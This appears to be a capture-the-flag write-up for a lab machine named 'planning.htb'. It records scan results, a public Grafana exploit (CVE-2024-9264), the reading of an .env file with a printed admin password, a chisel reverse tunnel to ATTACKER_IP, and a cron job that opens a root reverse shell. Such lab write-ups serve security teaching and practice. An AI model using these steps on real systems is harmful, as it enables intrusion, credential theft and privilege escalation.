**IP:**

---

## OS / Technology
- Ubuntu
- PHP
- Grafana v11.0.0 (83b9528bce)

---

## Users / Passwords
- `Bob Moss` (found during enumeration / post-exploitation)

---

## Services
- **80 HTTP**
  - Hostname: `planning.htb`
  - Simple site; limited source code and no obvious interesting paths from fuzzing
- **Grafana subdomain**
  - `grafana.planning.htb` — vulnerable Grafana instance (see CVE below)
- **22 SSH**
  - Open; used for later pivoting

---

## Nmap (important ports)
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```


## Technical details 
- Grafana exploit (CVE-2024-9264): used a public exploit against the discovered Grafana version to get code execution in the Grafana container.
- On the container:
```bash
# found .env with admin credentials
cat /etc/grafana/.env
# GF_SECURITY_ADMIN_USER=enzo
# GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```
- SSH to host:
```bash
ssh enzo@planning.htb
```
- Find local DB & credentials:
```bash
find / -type f -name 'crontab.db' 2>/dev/null
sqlite3 /path/to/crontab.db "SELECT * FROM users;"   # discovered password
```
- Port forwarding with chisel (reverse tunnel):
 1. Start chisel server on attacker:
    ```bash
    ./chisel server -p 9000 --reverse
    ```
 2. Run chisel client on target:
    ```bash
    ./chisel client ATTACKER_IP:9000 R:8001:127.0.0.1:8000
    ```
 3. Access `http://127.0.0.1:8001` locally to reach the remote `127.0.0.1:8000`.
- Use discovered credential to log into crontab web UI, add job to execute reverse shell, obtain root.

